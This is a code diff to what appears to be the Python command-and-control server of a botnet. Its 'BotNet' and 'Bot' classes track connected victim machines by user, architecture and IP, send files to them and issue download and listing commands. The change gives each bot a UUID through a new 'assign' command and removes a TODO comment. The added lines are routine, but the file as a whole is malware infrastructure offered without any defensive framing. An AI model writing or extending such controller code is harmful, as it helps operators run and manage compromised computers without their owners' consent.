@@ -9,6 +9,7 @@ import select
 import base64
 import os
 import time
+import uuid
 
 
 class BotNet(Thread):
@@ -56,6 +57,8 @@ class BotNet(Thread):
                 print("\tRestored!")
             else:
                 conn = Bot(clientsock, host_info, socketio)
+            if conn.bid is None:
+                conn.setId(str(uuid.uuid4()))
             self.onlineConnections[user] = conn
             self.logs[user] = BotLog(user)
             self.conncon.notifyAll()
@@ -343,12 +346,14 @@ class Bot:
     CLIENT_CLOSE = 'cclose'
     FILE_DOWNLOAD = 'down'
     LS_JSON = 'ls'
+    ASSIGN_ID = 'assign'
 
     def __init__(self, sock, host_info, socketio, lastonline=int(time.time()), online=True):
         self.sock = formatsock.FormatSocket(sock)
         self.user = host_info['user']
         self.arch = host_info['arch']
         self.ip = host_info['addr']
+        self.bid = host_info['bid']
 
         self.socketio = socketio
         self.lastonline = lastonline
@@ -368,6 +373,16 @@ class Bot:
                 self.sock.send(json_str)
             else:
                 self.opqueue.append((self.send, (cmd, sendtype)))
+
+    def setId(self, bid):
+        print("[*] Setting bot id to {}".format(bid))
+        json_str = json.dumps({Bot.ASSIGN_ID:bid})
+        with self.datalock:
+            if self.online:
+                self.sock.send(json_str)
+                self.bid = bid
+            else:
+                self.opqueue.append((self.setId,(bid,)))
 
     def recv(self):
         # Getting the object requires a lock, using it doesn't
@@ -428,7 +443,6 @@ class Bot:
                 return -1
 
     def sendFile(self, filename, fileobj):
-        # TODO: single worker thread instead of new one?
         with self.datalock:
             if self.online:
                 t = Thread(target=self.__sendFileHelper(fileobj, filename))
